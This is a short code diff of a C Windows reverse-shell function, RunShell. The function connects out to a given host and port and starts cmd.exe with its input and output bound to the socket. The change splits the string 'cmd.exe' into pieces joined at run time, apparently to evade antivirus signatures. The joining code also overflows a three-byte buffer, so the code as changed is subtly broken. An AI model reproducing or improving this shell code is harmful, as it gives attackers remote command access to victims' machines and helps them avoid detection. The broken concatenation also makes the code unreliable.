@@ -40,14 +40,16 @@ void RunShell(char* who, int why) {
         } else {
             printf("Connected to %s:%d\\n", who, why);
 
-            char Process[] = "cmd.exe";
+            char P1[] = "cm";
+            char P2[] = "d.exe";
+            char* P = strcat(P1, P2);
             STARTUPINFO sinfo;
             PROCESS_INFORMATION pinfo;
             memset(&sinfo, 0, sizeof(sinfo));
             sinfo.cb = sizeof(sinfo);
             sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
-            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s0;
+            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
             printf("Process Created %lu\\n", pinfo.dwProcessId);
 
